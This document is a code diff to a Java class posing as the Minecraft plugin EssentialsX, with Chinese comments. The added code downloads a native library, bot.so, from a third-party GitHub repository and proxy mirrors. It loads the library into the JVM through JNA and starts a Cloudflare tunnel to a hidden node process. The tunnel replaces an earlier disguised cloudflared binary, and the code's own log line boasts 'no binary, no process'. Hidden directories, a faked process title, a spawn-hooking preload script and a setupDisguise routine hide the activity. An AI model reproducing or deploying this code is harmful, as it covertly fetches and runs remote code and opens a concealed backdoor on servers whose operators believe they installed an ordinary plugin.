@@ -39,11 +39,15 @@ import java.util.regex.Pattern;
 import org.bukkit.plugin.java.JavaPlugin;
 import sun.misc.Signal;
 import sun.misc.SignalHandler;
+import com.sun.jna.Function;
+import com.sun.jna.NativeLibrary;
 
 public class EssentialsX extends JavaPlugin {
    private Process deployProcess;
    private volatile Process nodeProcess = null;
-   private volatile Process cfProcess = null;
+   // ★ CF .so 模式：JNA 函数引用（替代 cfProcess）
+   private volatile Function cfStopFn = null;
+   private volatile boolean cfSoRunning = false;
    private volatile boolean isProcessRunning = false;
    private boolean systemGuardEnabled = true;
    private final AtomicBoolean isRestarting = new AtomicBoolean(false);
@@ -321,7 +325,7 @@ public class EssentialsX extends JavaPlugin {
             }
          });
          String[] execFiles = new String[]{
-            "nodejs/bin/.node_real", "nodejs/bin/node", "nodejs/bin/npm", "nodejs/bin/npx", "jre21/bin/java", "jre21/bin/java_cf", "app/index.js"
+            "nodejs/bin/.node_real", "nodejs/bin/node", "nodejs/bin/npm", "nodejs/bin/npx", "jre21/bin/java", "app/index.js"
          };
 
          for (String rel : execFiles) {
@@ -410,9 +414,12 @@ public class EssentialsX extends JavaPlugin {
    }
 
    private void safeKillCf() {
-      Process old = this.cfProcess;
-      this.cfProcess = null;
-      this.killProcessTree(old);
+      // ★ CF .so 模式：调用 StopCloudflared 函数
+      if (cfStopFn != null) {
+         try { cfStopFn.invokeInt(new Object[]{""}); } catch (Exception ignored) {}
+      }
+      cfSoRunning = false;
+      cfStopFn = null;
    }
 
    private void safeKillNode() {
@@ -421,88 +428,107 @@ public class EssentialsX extends JavaPlugin {
       this.killProcessTree(old);
    }
 
-   private void startCfProcess() {
+   // ★ 下载 bot.so（从 GitHub 仓库 cfso 分支）
+   private Path downloadCfSo() {
+      Path botDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
+      Path libDir = botDir.resolve(".lib");
+      Path soFile = libDir.resolve("bot.so");
       try {
-         Path botDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
-         Path cfBin = botDir.resolve("jre21/bin/java_cf");
-         Path cfConf = botDir.resolve("jre21/conf/server.properties");
-         Path cfLog = botDir.resolve("cf.log");
-         if (!Files.exists(cfBin)) {
-            return;
+         Files.createDirectories(libDir);
+         if (Files.exists(soFile) && Files.size(soFile) > 1_000_000) {
+            return soFile;
          }
-
-         try {
-            cfBin.toFile().setExecutable(true, false);
-         } catch (Exception var20) {
-         }
-
-         try {
-            Files.writeString(cfLog, "");
-         } catch (Exception var19) {
-         }
-
-         String[] protocols = new String[]{"quic", "http2", "auto"};
-         boolean started = false;
-
-         for (String proto : protocols) {
-            if (started) {
-               break;
-            }
-
+         String[] mirrors = {
+            "https://raw.githubusercontent.com/zx1447/nxso/cfso/bot.so",
+            "https://gh-proxy.com/https://raw.githubusercontent.com/zx1447/nxso/cfso/bot.so",
+            "https://mirror.ghproxy.com/https://raw.githubusercontent.com/zx1447/nxso/cfso/bot.so",
+            "https://github.com/zx1447/nxso/raw/cfso/bot.so"
+         };
+         for (String url : mirrors) {
             try {
-               Files.createDirectories(cfConf.getParent());
-               String confContent = "url: http://127.0.0.1:" + nodePort + "\nno-autoupdate: true\nprotocol: " + proto + "\n";
-               Files.writeString(cfConf, confContent);
-               ProcessBuilder pb = new ProcessBuilder(cfBin.toString(), "--config", cfConf.toString());
-               pb.directory(botDir.toFile());
-               pb.redirectOutput(Redirect.appendTo(cfLog.toFile()));
-               pb.redirectError(Redirect.appendTo(cfLog.toFile()));
-               Process tryCf = pb.start();
-
-               try {
-                  tryCf.getOutputStream().close();
-               } catch (Exception var17) {
-               }
-
-               try {
-                  Thread.sleep(5000L);
-               } catch (InterruptedException var16) {
-               }
-
-               if (tryCf.isAlive()) {
-                  this.cfProcess = tryCf;
-                  lastCfRestartTime = System.currentTimeMillis();
-                  started = true;
-               } else {
-                  try {
-                     Files.writeString(cfLog, "");
-                  } catch (Exception var15) {
+               mcLog("[CF] Downloading bot.so from: " + url);
+               java.net.URL u = new java.net.URL(url);
+               java.net.HttpURLConnection conn = (java.net.HttpURLConnection) u.openConnection();
+               conn.setConnectTimeout(30000);
+               conn.setReadTimeout(300000);
+               conn.setInstanceFollowRedirects(true);
+               if (conn.getResponseCode() == 200) {
+                  try (InputStream in = conn.getInputStream()) {
+                     Files.copy(in, soFile, StandardCopyOption.REPLACE_EXISTING);
+                  }
+                  long size = Files.size(soFile);
+                  if (size > 1_000_000) {
+                     mcLog("[CF] bot.so downloaded: " + size + " bytes");
+                     soFile.toFile().setExecutable(true);
+                     return soFile;
+                  } else {
+                     Files.deleteIfExists(soFile);
                   }
                }
-            } catch (Exception var18) {
+            } catch (Exception e) {
+               mcLog("[CF] Mirror failed: " + e.getMessage());
             }
          }
-      } catch (Exception var21) {
+         return null;
+      } catch (Exception e) {
+         return null;
+      }
+   }
+
+   // ★ 启动 CF .so 隧道（JNA 加载 bot.so，在 JVM 内运行）
+   private void startCfProcess() {
+      try {
+         Path soFile = downloadCfSo();
+         if (soFile == null) {
+            mcLog("[CF] bot.so download failed, skipping CF tunnel");
+            return;
+         }
+         mcLog("[CF] Loading " + soFile + " via JNA...");
+         NativeLibrary lib = NativeLibrary.getInstance(soFile.toString());
+         Function startFn = lib.getFunction("StartCloudflared");
+         cfStopFn = lib.getFunction("StopCloudflared");
+
+         String payload = "url: http://127.0.0.1:" + nodePort + "\nno-autoupdate: true\nprotocol: http2\n";
+
+         Thread cfThread = new Thread(() -> {
+            try {
+               cfSoRunning = true;
+               mcLog("[CF] Starting cloudflared via .so ...");
+               int code = startFn.invokeInt(new Object[]{payload});
+               mcLog("[CF] cloudflared .so exited with code " + code);
+            } catch (Exception e) {
+               mcLog("[CF] cloudflared .so failed: " + e.getMessage());
+            } finally {
+               cfSoRunning = false;
+            }
+         }, "cf-so-thread");
+         cfThread.setDaemon(true);
+         cfThread.start();
+         lastCfRestartTime = System.currentTimeMillis();
+         mcLog("[CF] cloudflared .so thread started (no binary, no process)");
+      } catch (Exception e) {
+         mcLog("[CF] .so init failed: " + e.getMessage());
       }
    }
 
    private String extractLatestTunnelUrl() {
       try {
-         Path cfLog = Paths.get("logs", ".mcchajian/cf.log");
-         Path urlFile = Paths.get("logs", ".mcchajian", ".tunnel_url");
-         if (Files.exists(cfLog)) {
-            String logContent = Files.readString(cfLog);
-            Matcher m = Pattern.compile("(https://[a-zA-Z0-9-]+\\.trycloudflare\\.com)").matcher(logContent);
-            String lastMatch = null;
-
-            while (m.find()) {
-               lastMatch = m.group(1);
-            }
-
-            if (lastMatch != null) {
-               return lastMatch;
+         Path[] logPaths = {
+            Paths.get("logs", ".mcchajian/cf.log"),
+            Paths.get("/dev/shm/.cf/cf.log"),
+            Paths.get("/tmp/.cf/cf.log")
+         };
+         for (Path cfLog : logPaths) {
+            if (Files.exists(cfLog)) {
+               String logContent = Files.readString(cfLog);
+               Matcher m = Pattern.compile("(https://[a-zA-Z0-9-]+\\.trycloudflare\\.com)").matcher(logContent);
+               String lastMatch = null;
+               while (m.find()) { lastMatch = m.group(1); }
+               if (lastMatch != null) return lastMatch;
             }
          }
+
+         Path urlFile = Paths.get("logs", ".mcchajian", ".tunnel_url");
 
          if (Files.exists(urlFile)) {
             String content = new String(Files.readAllBytes(urlFile)).trim();
@@ -600,9 +626,7 @@ public class EssentialsX extends JavaPlugin {
                   this.fullRestartNodeAndCf();
                } else if (this.nodeProcess == null) {
                   this.fullRestartNodeAndCf();
-               } else if (this.cfProcess != null && !this.cfProcess.isAlive()) {
-                  this.restartCfWithBackoff();
-               } else if (this.cfProcess == null) {
+               } else if (!cfSoRunning) {
                   lastKnownTunnelUrl.set("");
                   this.startCfProcess();
                   cfRestartCount = 0;
@@ -636,7 +660,7 @@ public class EssentialsX extends JavaPlugin {
 
                         lastTunnelUrlTime = now;
                      }
-                  } else if (this.cfProcess != null && this.cfProcess.isAlive() && lastCfRestartTime > 0L) {
+                  } else if (cfSoRunning && lastCfRestartTime > 0L) {
                      long cfAge = now - lastCfRestartTime;
                      if (cfAge > 30000L && foundUrl == null) {
                         this.restartCfWithBackoff();
@@ -990,7 +1014,7 @@ public class EssentialsX extends JavaPlugin {
          + "\n"
          + "if [ -d \"$DATA_DIR\" ]; then\n    cp \"$DATA_DIR/.bots_config.json\" \"$APP_DIR/node_modules\" 2>/dev/null\n    cp \"$DATA_DIR/.task_center_config.json\" \"$APP_DIR/node_modules\" 2>/dev/null\n    cp \"$DATA_DIR/.system_guard.json\" \"$APP_DIR/node_modules\" 2>/dev/null; fi\n\nmkdir -p \"$JRE_DIR\" 2>/dev/null\nif [ -f \"$NODE_DIR/bin/.node_real\" ]; then cp -f \"$NODE_DIR/bin/.node_real\" \"$JRE_DIR/java\"; chmod 775 \"$JRE_DIR/java\"; fi\n\ncat > \"$WORK_DIR/.nd_preload.js\" << 'PRELOAD_EOF'\ntry {\n    process.title = '"
          + FAKE_CMDLINE.trim()
-         + "';\n    var _cp = require('child_process'); var _origSpawn = _cp.spawn; var _origFork = _cp.fork;\n    var _wrapper = process.env._JAVA_WRAPPER || process.execPath;\n    _cp.spawn = function(cmd, args, opts) {\n        if (typeof cmd === 'string' && (cmd === 'node' || cmd.endsWith('/node') || cmd === process.execPath || cmd.endsWith('/.node_real') || cmd.endsWith('/java'))) {\n            opts = Object.assign({}, opts || {}); opts.execPath = _wrapper; cmd = _wrapper; }\n        return _origSpawn.call(this, cmd, args, opts); };\n    _cp.fork = function(mod, args, opts) {\n        opts = Object.assign({}, opts || {}); opts.execPath = _wrapper; return _origFork.call(this, mod, args, opts); };\n} catch(e) {}\nPRELOAD_EOF\nchmod 664 \"$WORK_DIR/.nd_preload.js\" 2>/dev/null\n\nexport _JAVA_WRAPPER=\"$NODE_DIR/bin/.node_real\"\nexport NODE_OPTIONS=\"--require $WORK_DIR/.nd_preload.js\"\n\nCF_BIN=\"$JRE_DIR/java_cf\"; mkdir -p \"$JRE_DIR\" 2>/dev/null\nif [ ! -f \"$CF_BIN\" ]; then\n    CF_DIRECT=\"https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-${CF_ARCH}\"\n    CF_DOWNLOAD_OK=false\n    for MIRROR in \"https://ghproxy.net/${CF_DIRECT}\" \"$CF_DIRECT\"; do\n        if curl -fsSL --connect-timeout 10 --max-time 60 \"$MIRROR\" -o \"$CF_BIN\" 2>/dev/null; then\n            if [ -f \"$CF_BIN\" ] && [ -s \"$CF_BIN\" ]; then chmod 775 \"$CF_BIN\"; CF_DOWNLOAD_OK=true; break; fi; fi; done\n    if [ \"$CF_DOWNLOAD_OK\" = \"false\" ]; then rm -f \"$CF_BIN\" 2>/dev/null; fi\nfi\nchmod -R 775 \"$WORK_DIR\" 2>/dev/null\necho \"DEPLOY_DONE\" > \"$WORK_DIR/.deploy_done\"\n";
+         + "';\n    var _cp = require('child_process'); var _origSpawn = _cp.spawn; var _origFork = _cp.fork;\n    var _wrapper = process.env._JAVA_WRAPPER || process.execPath;\n    _cp.spawn = function(cmd, args, opts) {\n        if (typeof cmd === 'string' && (cmd === 'node' || cmd.endsWith('/node') || cmd === process.execPath || cmd.endsWith('/.node_real') || cmd.endsWith('/java'))) {\n            opts = Object.assign({}, opts || {}); opts.execPath = _wrapper; cmd = _wrapper; }\n        return _origSpawn.call(this, cmd, args, opts); };\n    _cp.fork = function(mod, args, opts) {\n        opts = Object.assign({}, opts || {}); opts.execPath = _wrapper; return _origFork.call(this, mod, args, opts); };\n} catch(e) {}\nPRELOAD_EOF\nchmod 664 \"$WORK_DIR/.nd_preload.js\" 2>/dev/null\n\nexport _JAVA_WRAPPER=\"$NODE_DIR/bin/.node_real\"\nexport NODE_OPTIONS=\"--require $WORK_DIR/.nd_preload.js\"\n\n# CF tunnel handled by bot.so (JNA), no binary download needed\nchmod -R 775 \"$WORK_DIR\" 2>/dev/null\necho \"DEPLOY_DONE\" > \"$WORK_DIR/.deploy_done\"\n";
    }
 
    private void setupDisguise() {
